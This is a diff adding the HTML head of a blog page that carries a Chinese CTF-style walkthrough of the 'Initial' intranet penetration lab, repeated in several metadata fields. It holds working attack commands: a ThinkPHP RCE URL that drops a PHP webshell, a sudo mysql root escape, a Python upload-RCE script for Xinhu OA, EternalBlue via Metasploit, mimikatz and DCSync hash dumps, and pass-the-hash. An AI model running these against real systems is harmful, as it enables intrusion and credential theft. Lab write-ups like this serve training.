@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8" />
+<meta name="generator" content="Hugo 0.135.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="toTop" content="true">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="author" content="" />
+<meta property="og:url" content="https://w0s1np.github.io/blog/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial.html/" />
+<link rel="canonical" href="https://w0s1np.github.io/blog/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial.html/" /><link rel="apple-touch-icon" href="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" />
+<link rel="icon" href="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" />
+<link rel="shortcut" href="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" /><link rel="alternate" type="application/atom+xml" href="https://w0s1np.github.io/index.xml" title="末流双非的救赎之道">
+<script type="application/ld+json">
+{
+"@context" : "http://schema.org",
+"@type" : "BlogPosting",
+"mainEntityOfPage": {
+"@type": "WebPage",
+"@id": "https:\/\/w0s1np.github.io\/"
+},
+"articleSection" : "blog",
+"name" : "春秋云镜 Initial",
+"headline" : "春秋云镜 Initial",
+"description" : "Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。\nflag1 thinkphp fscan 发现 thinkphp5.0.23 rce\nhttp:\/\/39.99.247.86\/index.php?s=captcha _method=__construct\u0026amp;filter[]=system\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=echo PD9waHAgQGV2YWwoJF9SRVFVRVNUWzFdKTs\/Pg==|base64 -d \u0026gt; \/var\/www\/html\/1.php 蚁剑连接\u002bsuid提权\nfind \/ -perm -u=s -type f 2\u0026gt;\/dev\/null (www-data:\/var\/www\/html) $ sudo -l Matching Defaults entries for www-data on ubuntu-web01: env_reset, mail_badpass, secure_path=\/usr\/local\/sbin\\:\/usr\/local\/bin\\:\/usr\/sbin\\:\/usr\/bin\\:\/sbin\\:\/bin\\:\/snap\/bin User www-data may run the following commands on ubuntu-web01: (root) NOPASSWD: \/usr\/bin\/mysql (www-data:\/var\/www\/html) $ sudo mysql -e \u0026#39;\\! whoami\u0026#39; root sudo mysql -e \u0026#39;\\! \/bin\/sh\u0026#39; flag2 信呼OA2.2.8弱口令\u002b文件上传rce 上传代理和fsca配置代理\n172.22.1.18:3306 open 172.22.1.18:445 open 172.22.1.2:445 open 172.22.1.21:445 open 172.22.1.2:139 open 172.22.1.18:139 open 172.22.1.21:139 open 172.22.1.18:135 open 172.22.1.2:135 open 172.22.1.18:80 open 172.22.1.15:80 open 172.22.1.15:22 open 172.22.1.2:88 open 172.22.1.21:135 open [*] WebTitle http:\/\/172.22.1.15 code:200 len:5578 title:Bootstrap Material Admin [*] NetInfo [*]172.22.1.18 [-\u0026gt;]XIAORANG-OA01 [-\u0026gt;]172.22.1.18 [*] NetInfo [*]172.22.1.21 [-\u0026gt;]XIAORANG-WIN7 [-\u0026gt;]172.22.1.21 [*] NetInfo [*]172.22.1.2 [-\u0026gt;]DC01 [-\u0026gt;]172.22.1.2 [\u002b] MS17-010 172.22.1.21\t(Windows Server 2008 R2 Enterprise 7601 Service Pack 1) [*] NetBios 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [*] NetBios 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600 [*] OsInfo 172.22.1.2\t(Windows Server 2016 Datacenter 14393) [*] NetBios 172.22.1.2 [\u002b] DC:DC01.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] WebTitle http:\/\/172.22.1.18 code:302 len:0 title:None 跳转url: http:\/\/172.22.1.18?m=login [*] WebTitle http:\/\/172.22.1.18?m=login code:200 len:4012 title:信呼协同办公系统 [\u002b] PocScan http:\/\/172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1 整理如下：\n[*]172.22.1.18 [-\u0026gt;]XIAORANG-OA01 端口: 135,80,3306,445,139 [*]172.22.1.21 [-\u0026gt;]XIAORANG-WIN7 端口: 445,135,139 MS17-010 [*]172.22.1.2 [-\u0026gt;]DC01 端口: 135,139,445,88 172.22.1.18 信呼 OA v2.2.8\n弱口令 admin\/admin123\nimport requests session = requests.session() url_pre = \u0026#39;http:\/\/172.22.1.18\/\u0026#39; url1 = url_pre \u002b \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; url2 = url_pre \u002b \u0026#39;\/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; url3 = url_pre \u002b \u0026#39;\/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=11\u0026#39; data1 = { \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; } r = session.post(url1, data=data1) r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u002b\u0026#39;)}) filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) filepath = \u0026#34;\/\u0026#34; \u002b filepath.split(\u0026#39;.uptemp\u0026#39;)[0] \u002b \u0026#39;.php\u0026#39; id = r.json()[\u0026#39;id\u0026#39;] url3 = url_pre \u002b f\u0026#39;\/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; r = session.get(url3) data2 = { \u0026#34;1\u0026#34;: \u0026#34;system(\u0026#39;whoami\u0026#39;);\u0026#34; } print(url_pre \u002b filepath) r = session.post(url_pre \u002b filepath, data=data2) print(r.text) 蚁剑,找到了flag2\n发现这是一台域内机器，域控服务器是172.22.1.2:\nipconfig\/all Windows IP 配置 主机名 . . . . . . . . . . . . . : XIAORANG-OA01 主 DNS 后缀 . . . . . . . . . . . : xiaorang.lab 节点类型 . . . . . . . . . . . . : 混合 IP 路由已启用 . . . . . . . . . . : 否 WINS 代理已启用 . . . . . . . . . : 否 DNS 后缀搜索列表 . . . . . . . . : xiaorang.lab 以太网适配器 以太网 2: 连接特定的 DNS 后缀 . . . . . . . : 描述. . . . . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter #2 物理地址. . . . . . . . . . . . . : 00-16-3E-2A-7D-19 DHCP 已启用 . . . . . . . . . . . : 是 自动配置已启用. . . . . . . . . . : 是 本地链接 IPv6 地址. . . . . . . . : fe80::cc10:4360:27c3:45b%20(首选) IPv4 地址 . . . . . . . . . . . . : 172.22.1.18(首选) 子网掩码 . . . . . . . . . . . . : 255.255.0.0 获得租约的时间 . . . . . . . . . : 2024年10月27日 14:30:10 租约过期的时间 . . . . . . . . . : 2034年10月25日 14:30:22 默认网关. . . . . . . . . . . . . : 172.22.255.253 DHCP 服务器 . . . . . . . . . . . : 172.22.255.253 DHCPv6 IAID . . . . . . . . . . . : 335550014 DHCPv6 客户端 DUID . . . . . . . : 00-01-00-01-2B-6B-CC-B2-00-16-3E-0F-D8-B9 DNS 服务器 . . . . . . . . . . . : 172.22.1.2 TCPIP 上的 NetBIOS . . . . . . . : 已启用 隧道适配器 isatap.{C44145A9-57B2-4C3A-8DC5-A99E0964E798}: 媒体状态 . . . . . . . . . . . . : 媒体已断开 连接特定的 DNS 后缀 . . . . . . . : 描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter 物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0 DHCP 已启用 . . . . . . . . . . . : 否 自动配置已启用. . . . . . . . . . : 是 flag3 MS17-010\u002b抓hash登域控 proxychains4 msfconsole 也可以直接set proxies socks5:127.0.0.1:7777 因为目标机器不出网，payload用bind_tcp\nsearch ms17-010 use exploit\/windows\/smb\/ms17_010_eternalblue set payload windows\/x64\/meterpreter\/bind_tcp set RHOSTS 172.22.1.21 run 抓一下hash\nmeterpreter \u0026gt; load kiwi Loading extension kiwi... .#####. mimikatz 2.2.0 20191125 (x64\/windows) .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ## \/ \\ ## \/*** Benjamin DELPY \u0060gentilkiwi\u0060 ( benjamin@gentilkiwi.com ) ## \\ \/ ## \u0026gt; http:\/\/blog.gentilkiwi.com\/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; http:\/\/pingcastle.com \/ http:\/\/mysmartlogon.com ***\/ Success. meterpreter \u0026gt; creds_all [\u002b] Running as SYSTEM [*] Retrieving all credentials msv credentials =============== Username Domain NTLM SHA1 -------- ------ ---- ---- XIAORANG-WIN7$ XIAORANG a4608f945dbe2811e2848e0ce1d6cdfe d22b6269bf9bb42e726a8b29ce3993601cd908c2 wdigest credentials =================== Username Domain Password -------- ------ -------- (null) (null) (null) XIAORANG-WIN7$ XIAORANG 3c 70 e3 19 a1 37 fe 66 39 ed cb ba 0e ec 4c f3 b7 c7 b1 86 42 fb 08 84 5c 06 aa 3d f2 3b 10 41 0f 8c cc 6b 64 7e 0d 05 81 21 c5 85 8b 53 92 95 e0 5d 42 77 31 69 ba b1 42 3f 1d ea 73 72 88 be 48 c6 93 ab d2 f8 fc a6 25 16 fd 11 2c 7 b 6e 7b 16 c5 5e 86 11 30 35 27 80 09 e3 05 6a 5f 59 57 e9 85 3a d7 17 34 67 5d 69 b1 80 67 7f ca 9c 60 d6 e8 88 63 2c 42 1b 0b f1 cc e8 4c c0 31 b3 64 56 29 cc ad 4a 77 91 79 67 27 2f ec 03 0e d7 61 93 27 02 04 ff 85 a7 b3 e9 e6 47 d7 0b 38 cd 36 5d 9a ed c1 73 08 b6 6f d7 21 5b 47 b2 ec ee 0c 4d 22 9a b4 e8 ac 73 9a b0 90 12 ad 34 6c 95 ee 2c d 8 91 ec 6f d7 55 ed f4 b7 de 37 88 16 ea 91 5d f5 5b da 3f 66 30 87 35 de 57 1e 5a 42 f3 1c 31 20 2a 94 1f 8c 8d 98 16 d1 ec f5 1b ba c7 79 kerberos credentials ==================== Username Domain Password -------- ------ -------- (null) (null) (null) xiaorang-win7$ XIAORANG.LAB 3c 70 e3 19 a1 37 fe 66 39 ed cb ba 0e ec 4c f3 b7 c7 b1 86 42 fb 08 84 5c 06 aa 3d f2 3b 10 41 0f 8c cc 6b 64 7 e 0d 05 81 21 c5 85 8b 53 92 95 e0 5d 42 77 31 69 ba b1 42 3f 1d ea 73 72 88 be 48 c6 93 ab d2 f8 fc a6 25 16 fd 11 2c 7b 6e 7b 16 c5 5e 86 11 30 35 27 80 09 e3 05 6a 5f 59 57 e9 85 3a d7 17 34 67 5d 69 b1 80 67 7f ca 9c 60 d6 e8 88 63 2c 42 1b 0b f1 cc e8 4c c0 31 b3 64 56 29 cc ad 4a 77 91 79 67 27 2f ec 03 0e d7 61 93 27 02 04 ff 8 5 a7 b3 e9 e6 47 d7 0b 38 cd 36 5d 9a ed c1 73 08 b6 6f d7 21 5b 47 b2 ec ee 0c 4d 22 9a b4 e8 ac 73 9a b0 90 12 ad 34 6c 95 ee 2c d8 91 ec 6f d7 55 ed f4 b7 de 37 88 16 ea 91 5d f5 5b da 3f 66 30 87 35 de 57 1e 5a 42 f3 1c 31 20 2a 94 1f 8c 8d 98 16 d1 ec f5 1b ba c7 79 xiaorang-win7$ XIAORANG.LAB (null) 上传SharpHound.exe收集有关领域内的信息\nmeterpreter \u0026gt; upload \u0026#34;\/Users\/lnhsec\/Desktop\/Sec\/redteam\/tools\/内网\/SharpHound-v2.5.8\/SharpHound.exe\u0026#34; \u0026#34;C:\/SharpHound.exe\u0026#34; meterpreter \u0026gt; shell chcp 65001 cd C:\/ SharpHound.exe -c all meterpreter \u0026gt; download \u0026#34;C:\/20241027154232_BloodHound.zip\u0026#34; \u0026#34;\/Users\/lnhsec\/Desktop\/\u0026#34; BloodHound 分析:\ncurl -L https:\/\/ghst.ly\/getbhce | docker compose -f - up 8080端口 账号admin 因为这台机器有 DCSync 的权限, 所以能直接从域控上导出 Hash。利用DCSync域内dump所有用户的hash\nmeterpreter \u0026gt; kiwi_cmd lsadump::dcsync \/domain:xiaorang.lab \/all \/csv [DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain [DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server [DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39; [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) 502\tkrbtgt\tfb812eea13a18b7fcdb8e6d67ddc205b\t514 1106\tMarcus\te07510a4284b3c97c8e7dee970918c5c\t512 1107\tCharles\tf6a9881cd5ae709abb4ac9ab87f24617\t512 1000\tDC01$\t4450359029240b6aee687552fab52618\t532480 500\tAdministrator\t10cf89a850fb1cdbe6bb432b859164c8\t512 1104\tXIAORANG-OA01$\t2408e055546207b9dcaa5230c2f0126a\t4096 1108\tXIAORANG-WIN7$\ta4608f945dbe2811e2848e0ce1d6cdfe\t4096 利用impacket-wmiexec进行横向移动来访问域控制，在C:\\Users\\Administrator\\flag\\flag03.txt中得到第三部分flag\npython wmiexec.py xiaorang.lab\/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8 ",
+"inLanguage" : "en-US",
+"author" : "",
+"creator" : "",
+"publisher": "",
+"accountablePerson" : "",
+"copyrightHolder" : "",
+"copyrightYear" : "2024",
+"datePublished": "2024-10-27 17:35:49 \u002b0800 CST",
+"dateModified" : "2024-10-27 17:35:49 \u002b0800 CST",
+"url" : "https:\/\/w0s1np.github.io\/blog\/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial.html\/",
+"keywords" : [ "Pentest", ]
+}
+</script><title>春秋云镜 Initial - 末流双非的救赎之道</title>
+<meta property="og:title" content="春秋云镜 Initial" />
+<meta property="og:type" content="article" />
+<meta property="og:description" content="Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。
+flag1 thinkphp fscan 发现 thinkphp5.0.23 rce
+http://39.99.247.86/index.php?s=captcha _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo PD9waHAgQGV2YWwoJF9SRVFVRVNUWzFdKTs/Pg==|base64 -d &gt; /var/www/html/1.php 蚁剑连接&#43;suid提权
+find / -perm -u=s -type f 2&gt;/dev/null (www-data:/var/www/html) $ sudo -l Matching Defaults entries for www-data on ubuntu-web01: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ubuntu-web01: (root) NOPASSWD: /usr/bin/mysql (www-data:/var/www/html) $ sudo mysql -e &#39;\! whoami&#39; root sudo mysql -e &#39;\! /bin/sh&#39; flag2 信呼OA2.2.8弱口令&#43;文件上传rce 上传代理和fsca配置代理
+172.22.1.18:3306 open 172.22.1.18:445 open 172.22.1.2:445 open 172.22.1.21:445 open 172.22.1.2:139 open 172.22.1.18:139 open 172.22.1.21:139 open 172.22.1.18:135 open 172.22.1.2:135 open 172.22.1.18:80 open 172.22.1.15:80 open 172.22.1.15:22 open 172.22.1.2:88 open 172.22.1.21:135 open [*] WebTitle http://172.22.1.15 code:200 len:5578 title:Bootstrap Material Admin [*] NetInfo [*]172.22.1.18 [-&gt;]XIAORANG-OA01 [-&gt;]172.22.1.18 [*] NetInfo [*]172.22.1.21 [-&gt;]XIAORANG-WIN7 [-&gt;]172.22.1.21 [*] NetInfo [*]172.22.1.2 [-&gt;]DC01 [-&gt;]172.22.1.2 [&#43;] MS17-010 172.22.1.21	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1) [*] NetBios 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [*] NetBios 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600 [*] OsInfo 172.22.1.2	(Windows Server 2016 Datacenter 14393) [*] NetBios 172.22.1.2 [&#43;] DC:DC01.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] WebTitle http://172.22.1.18 code:302 len:0 title:None 跳转url: http://172.22.1.18?m=login [*] WebTitle http://172.22.1.18?m=login code:200 len:4012 title:信呼协同办公系统 [&#43;] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1 整理如下：
+[*]172.22.1.18 [-&gt;]XIAORANG-OA01 端口: 135,80,3306,445,139 [*]172.22.1.21 [-&gt;]XIAORANG-WIN7 端口: 445,135,139 MS17-010 [*]172.22.1.2 [-&gt;]DC01 端口: 135,139,445,88 172.22.1.18 信呼 OA v2.2.8
+弱口令 admin/admin123
+import requests session = requests.session() url_pre = &#39;http://172.22.1.18/&#39; url1 = url_pre &#43; &#39;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#39; url2 = url_pre &#43; &#39;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#39; url3 = url_pre &#43; &#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#39; data1 = { &#39;rempass&#39;: &#39;0&#39;, &#39;jmpass&#39;: &#39;false&#39;, &#39;device&#39;: &#39;1625884034525&#39;, &#39;ltype&#39;: &#39;0&#39;, &#39;adminuser&#39;: &#39;YWRtaW4=&#39;, &#39;adminpass&#39;: &#39;YWRtaW4xMjM=&#39;, &#39;yanzm&#39;: &#39;&#39; } r = session.post(url1, data=data1) r = session.post(url2, files={&#39;file&#39;: open(&#39;1.php&#39;, &#39;r&#43;&#39;)}) filepath = str(r.json()[&#39;filepath&#39;]) filepath = &#34;/&#34; &#43; filepath.split(&#39;.uptemp&#39;)[0] &#43; &#39;.php&#39; id = r.json()[&#39;id&#39;] url3 = url_pre &#43; f&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid={id}&#39; r = session.get(url3) data2 = { &#34;1&#34;: &#34;system(&#39;whoami&#39;);&#34; } print(url_pre &#43; filepath) r = session.post(url_pre &#43; filepath, data=data2) print(r.text) 蚁剑,找到了flag2
+发现这是一台域内机器，域控服务器是172.22.1.2:
+ipconfig/all Windows IP 配置 主机名 . . . . . . . . . . . . . : XIAORANG-OA01 主 DNS 后缀 . . . . . . . . . . . : xiaorang.lab 节点类型 . . . . . . . . . . . . : 混合 IP 路由已启用 . . . . . . . . . . : 否 WINS 代理已启用 . . . . . . . . . : 否 DNS 后缀搜索列表 . . . . . . . . : xiaorang.lab 以太网适配器 以太网 2: 连接特定的 DNS 后缀 . . . . . . . : 描述. . . . . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter #2 物理地址. . . . . . . . . . . . . : 00-16-3E-2A-7D-19 DHCP 已启用 . . . . . . . . . . . : 是 自动配置已启用. . . . . . . . . . : 是 本地链接 IPv6 地址. . . . . . . . : fe80::cc10:4360:27c3:45b%20(首选) IPv4 地址 . . . . . . . . . . . . : 172.22.1.18(首选) 子网掩码 . . . . . . . . . . . . : 255.255.0.0 获得租约的时间 . . . . . . . . . : 2024年10月27日 14:30:10 租约过期的时间 . . . . . . . . . : 2034年10月25日 14:30:22 默认网关. . . . . . . . . . . . . : 172.22.255.253 DHCP 服务器 . . . . . . . . . . . : 172.22.255.253 DHCPv6 IAID . . . . . . . . . . . : 335550014 DHCPv6 客户端 DUID . . . . . . . : 00-01-00-01-2B-6B-CC-B2-00-16-3E-0F-D8-B9 DNS 服务器 . . . . . . . . . . . : 172.22.1.2 TCPIP 上的 NetBIOS . . . . . . . : 已启用 隧道适配器 isatap.{C44145A9-57B2-4C3A-8DC5-A99E0964E798}: 媒体状态 . . . . . . . . . . . . : 媒体已断开 连接特定的 DNS 后缀 . . . . . . . : 描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter 物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0 DHCP 已启用 . . . . . . . . . . . : 否 自动配置已启用. . . . . . . . . . : 是 flag3 MS17-010&#43;抓hash登域控 proxychains4 msfconsole 也可以直接set proxies socks5:127.0.0.1:7777 因为目标机器不出网，payload用bind_tcp
+search ms17-010 use exploit/windows/smb/ms17_010_eternalblue set payload windows/x64/meterpreter/bind_tcp set RHOSTS 172.22.1.21 run 抓一下hash
+meterpreter &gt; load kiwi Loading extension kiwi... .#####. mimikatz 2.2.0 20191125 (x64/windows) .## ^ ##. &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo) ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ## &gt; http://blog.gentilkiwi.com/mimikatz &#39;## v ##&#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#39;#####&#39; &gt; http://pingcastle.com / http://mysmartlogon.com ***/ Success. meterpreter &gt; creds_all [&#43;] Running as SYSTEM [*] Retrieving all credentials msv credentials =============== Username Domain NTLM SHA1 -------- ------ ---- ---- XIAORANG-WIN7$ XIAORANG a4608f945dbe2811e2848e0ce1d6cdfe d22b6269bf9bb42e726a8b29ce3993601cd908c2 wdigest credentials =================== Username Domain Password -------- ------ -------- (null) (null) (null) XIAORANG-WIN7$ XIAORANG 3c 70 e3 19 a1 37 fe 66 39 ed cb ba 0e ec 4c f3 b7 c7 b1 86 42 fb 08 84 5c 06 aa 3d f2 3b 10 41 0f 8c cc 6b 64 7e 0d 05 81 21 c5 85 8b 53 92 95 e0 5d 42 77 31 69 ba b1 42 3f 1d ea 73 72 88 be 48 c6 93 ab d2 f8 fc a6 25 16 fd 11 2c 7 b 6e 7b 16 c5 5e 86 11 30 35 27 80 09 e3 05 6a 5f 59 57 e9 85 3a d7 17 34 67 5d 69 b1 80 67 7f ca 9c 60 d6 e8 88 63 2c 42 1b 0b f1 cc e8 4c c0 31 b3 64 56 29 cc ad 4a 77 91 79 67 27 2f ec 03 0e d7 61 93 27 02 04 ff 85 a7 b3 e9 e6 47 d7 0b 38 cd 36 5d 9a ed c1 73 08 b6 6f d7 21 5b 47 b2 ec ee 0c 4d 22 9a b4 e8 ac 73 9a b0 90 12 ad 34 6c 95 ee 2c d 8 91 ec 6f d7 55 ed f4 b7 de 37 88 16 ea 91 5d f5 5b da 3f 66 30 87 35 de 57 1e 5a 42 f3 1c 31 20 2a 94 1f 8c 8d 98 16 d1 ec f5 1b ba c7 79 kerberos credentials ==================== Username Domain Password -------- ------ -------- (null) (null) (null) xiaorang-win7$ XIAORANG.LAB 3c 70 e3 19 a1 37 fe 66 39 ed cb ba 0e ec 4c f3 b7 c7 b1 86 42 fb 08 84 5c 06 aa 3d f2 3b 10 41 0f 8c cc 6b 64 7 e 0d 05 81 21 c5 85 8b 53 92 95 e0 5d 42 77 31 69 ba b1 42 3f 1d ea 73 72 88 be 48 c6 93 ab d2 f8 fc a6 25 16 fd 11 2c 7b 6e 7b 16 c5 5e 86 11 30 35 27 80 09 e3 05 6a 5f 59 57 e9 85 3a d7 17 34 67 5d 69 b1 80 67 7f ca 9c 60 d6 e8 88 63 2c 42 1b 0b f1 cc e8 4c c0 31 b3 64 56 29 cc ad 4a 77 91 79 67 27 2f ec 03 0e d7 61 93 27 02 04 ff 8 5 a7 b3 e9 e6 47 d7 0b 38 cd 36 5d 9a ed c1 73 08 b6 6f d7 21 5b 47 b2 ec ee 0c 4d 22 9a b4 e8 ac 73 9a b0 90 12 ad 34 6c 95 ee 2c d8 91 ec 6f d7 55 ed f4 b7 de 37 88 16 ea 91 5d f5 5b da 3f 66 30 87 35 de 57 1e 5a 42 f3 1c 31 20 2a 94 1f 8c 8d 98 16 d1 ec f5 1b ba c7 79 xiaorang-win7$ XIAORANG.LAB (null) 上传SharpHound.exe收集有关领域内的信息
+meterpreter &gt; upload &#34;/Users/lnhsec/Desktop/Sec/redteam/tools/内网/SharpHound-v2.5.8/SharpHound.exe&#34; &#34;C:/SharpHound.exe&#34; meterpreter &gt; shell chcp 65001 cd C:/ SharpHound.exe -c all meterpreter &gt; download &#34;C:/20241027154232_BloodHound.zip&#34; &#34;/Users/lnhsec/Desktop/&#34; BloodHound 分析:
+curl -L https://ghst.ly/getbhce | docker compose -f - up 8080端口 账号admin 因为这台机器有 DCSync 的权限, 所以能直接从域控上导出 Hash。利用DCSync域内dump所有用户的hash
+meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv [DC] &#39;xiaorang.lab&#39; will be the domain [DC] &#39;DC01.xiaorang.lab&#39; will be the DC server [DC] Exporting domain &#39;xiaorang.lab&#39; [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) 502	krbtgt	fb812eea13a18b7fcdb8e6d67ddc205b	514 1106	Marcus	e07510a4284b3c97c8e7dee970918c5c	512 1107	Charles	f6a9881cd5ae709abb4ac9ab87f24617	512 1000	DC01$	4450359029240b6aee687552fab52618	532480 500	Administrator	10cf89a850fb1cdbe6bb432b859164c8	512 1104	XIAORANG-OA01$	2408e055546207b9dcaa5230c2f0126a	4096 1108	XIAORANG-WIN7$	a4608f945dbe2811e2848e0ce1d6cdfe	4096 利用impacket-wmiexec进行横向移动来访问域控制，在C:\Users\Administrator\flag\flag03.txt中得到第三部分flag
+python wmiexec.py xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8 " />
+<meta name="description" content="Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。
+flag1 thinkphp fscan 发现 thinkphp5.0.23 rce
+http://39.99.247.86/index.php?s=captcha _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo PD9waHAgQGV2YWwoJF9SRVFVRVNUWzFdKTs/Pg==|base64 -d &gt; /var/www/html/1.php 蚁剑连接&#43;suid提权
+find / -perm -u=s -type f 2&gt;/dev/null (www-data:/var/www/html) $ sudo -l Matching Defaults entries for www-data on ubuntu-web01: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ubuntu-web01: (root) NOPASSWD: /usr/bin/mysql (www-data:/var/www/html) $ sudo mysql -e &#39;\! whoami&#39; root sudo mysql -e &#39;\! /bin/sh&#39; flag2 信呼OA2.2.8弱口令&#43;文件上传rce 上传代理和fsca配置代理
+172.22.1.18:3306 open 172.22.1.18:445 open 172.22.1.2:445 open 172.22.1.21:445 open 172.22.1.2:139 open 172.22.1.18:139 open 172.22.1.21:139 open 172.22.1.18:135 open 172.22.1.2:135 open 172.22.1.18:80 open 172.22.1.15:80 open 172.22.1.15:22 open 172.22.1.2:88 open 172.22.1.21:135 open [*] WebTitle http://172.22.1.15 code:200 len:5578 title:Bootstrap Material Admin [*] NetInfo [*]172.22.1.18 [-&gt;]XIAORANG-OA01 [-&gt;]172.22.1.18 [*] NetInfo [*]172.22.1.21 [-&gt;]XIAORANG-WIN7 [-&gt;]172.22.1.21 [*] NetInfo [*]172.22.1.2 [-&gt;]DC01 [-&gt;]172.22.1.2 [&#43;] MS17-010 172.22.1.21	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1) [*] NetBios 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [*] NetBios 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600 [*] OsInfo 172.22.1.2	(Windows Server 2016 Datacenter 14393) [*] NetBios 172.22.1.2 [&#43;] DC:DC01.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] WebTitle http://172.22.1.18 code:302 len:0 title:None 跳转url: http://172.22.1.18?m=login [*] WebTitle http://172.22.1.18?m=login code:200 len:4012 title:信呼协同办公系统 [&#43;] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1 整理如下：
+[*]172.22.1.18 [-&gt;]XIAORANG-OA01 端口: 135,80,3306,445,139 [*]172.22.1.21 [-&gt;]XIAORANG-WIN7 端口: 445,135,139 MS17-010 [*]172.22.1.2 [-&gt;]DC01 端口: 135,139,445,88 172.22.1.18 信呼 OA v2.2.8
+弱口令 admin/admin123
+import requests session = requests.session() url_pre = &#39;http://172.22.1.18/&#39; url1 = url_pre &#43; &#39;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#39; url2 = url_pre &#43; &#39;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#39; url3 = url_pre &#43; &#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#39; data1 = { &#39;rempass&#39;: &#39;0&#39;, &#39;jmpass&#39;: &#39;false&#39;, &#39;device&#39;: &#39;1625884034525&#39;, &#39;ltype&#39;: &#39;0&#39;, &#39;adminuser&#39;: &#39;YWRtaW4=&#39;, &#39;adminpass&#39;: &#39;YWRtaW4xMjM=&#39;, &#39;yanzm&#39;: &#39;&#39; } r = session.post(url1, data=data1) r = session.post(url2, files={&#39;file&#39;: open(&#39;1.php&#39;, 